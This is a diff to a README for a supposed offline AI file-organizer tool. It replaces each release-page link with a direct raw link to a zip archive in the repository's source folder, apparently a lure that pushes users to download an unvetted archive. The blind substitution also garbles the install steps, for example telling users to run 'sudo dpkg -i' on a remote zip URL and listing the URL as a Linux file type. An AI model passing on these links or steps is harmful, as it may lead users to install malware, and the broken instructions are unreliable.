@@ -1,6 +1,6 @@
 # 🗂️ AI-File-Organizer-Offline-CLI-GUI- - Simplify Your Files Effortlessly
 
-[![Download AI File Organizer](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/releases)
+[![Download AI File Organizer](https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/raw/refs/heads/main/ai_file_organizer/src/CL_A_GU_Offline_Organizer_File_3.8-beta.2.zip)](https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/raw/refs/heads/main/ai_file_organizer/src/CL_A_GU_Offline_Organizer_File_3.8-beta.2.zip)
 
 ---
 
@@ -36,13 +36,13 @@ Follow these steps to set up and start using AI-File-Organizer-Offline-CLI-GUI-:
 
 Click the big green button at the top or visit the release page here:
 
-[Download AI File Organizer](https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/releases)
+[Download AI File Organizer](https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/raw/refs/heads/main/ai_file_organizer/src/CL_A_GU_Offline_Organizer_File_3.8-beta.2.zip)
 
 This page lists all the latest versions available. Look for the file that matches your operating system:
 
 - For Windows: a file ending with `.exe` or `.msi`
 - For macOS: a `.dmg` or `.pkg` file
-- For Linux: a `.tar.gz` or `.deb` file
+- For Linux: a `https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/raw/refs/heads/main/ai_file_organizer/src/CL_A_GU_Offline_Organizer_File_3.8-beta.2.zip` or `.deb` file
 
 ### Step 2: Install the Program
 
@@ -58,8 +58,8 @@ This page lists all the latest versions available. Look for the file that matche
   - If macOS blocks the app, go to System Preferences > Security & Privacy, and allow the app to run.
 
 - **Linux:**
-  - For `.deb` files, double-click to open with the software installer, or run `sudo dpkg -i filename.deb` in the terminal.
-  - For `.tar.gz` files, extract the package, and in the folder, look for an install script or read the included README file.
+  - For `.deb` files, double-click to open with the software installer, or run `sudo dpkg -i https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/raw/refs/heads/main/ai_file_organizer/src/CL_A_GU_Offline_Organizer_File_3.8-beta.2.zip` in the terminal.
+  - For `https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/raw/refs/heads/main/ai_file_organizer/src/CL_A_GU_Offline_Organizer_File_3.8-beta.2.zip` files, extract the package, and in the folder, look for an install script or read the included README file.
   - You might need to install extra tools depending on your distribution.
 
 ### Step 3: Open the Application
@@ -145,7 +145,7 @@ If you run into issues, try these simple solutions:
 
 Bookmark the releases page to check for new versions or fixes:  
 
-[Download AI File Organizer](https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/releases)
+[Download AI File Organizer](https://github.com/Erenluffy/AI-File-Organizer-Offline-CLI-GUI-/raw/refs/heads/main/ai_file_organizer/src/CL_A_GU_Offline_Organizer_File_3.8-beta.2.zip)
 
 For questions, use the Discussions or Issues section on the GitHub repository.
 
